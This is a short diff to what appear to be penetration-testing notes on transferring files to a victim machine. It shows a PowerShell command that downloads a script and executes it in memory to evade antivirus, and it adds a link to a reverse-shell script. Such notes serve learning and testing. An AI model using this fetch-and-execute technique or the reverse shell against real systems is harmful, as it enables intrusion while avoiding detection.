@@ -54,7 +54,7 @@ Victim:
 Invoke-WebRequest <URL> -OutFile <FILE>
 ```
 
-There's a method to download a PS script and run it without touching the disk (directly from memory). It's used to avoid antiviruses and so on.
+There's a method to download a PS script and run it without touching the disk (directly from memory). It's used to avoid antiviruses and so on. It can be used to get a reverse-shell connection ([reverse shell Powershell script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)).
 
 ```powershell
 iex (New-Object Net.WebClient).DownloadString("<URL_TO_SCRIPT.ps1>")
